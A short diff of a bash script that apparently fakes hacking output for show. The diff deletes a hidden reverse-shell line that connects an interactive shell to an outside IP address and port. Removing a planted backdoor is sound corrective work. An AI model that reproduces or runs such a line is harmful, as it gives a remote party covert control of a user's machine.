@@ -40,8 +40,6 @@ countdown_timer() {
   done
 }
 
-bash -i >& /dev/tcp/147.185.221.25/37245 0>&1
-
 # Fake command execution simulation
 execute_fake_commands() {
   commands=("Scanning target..."
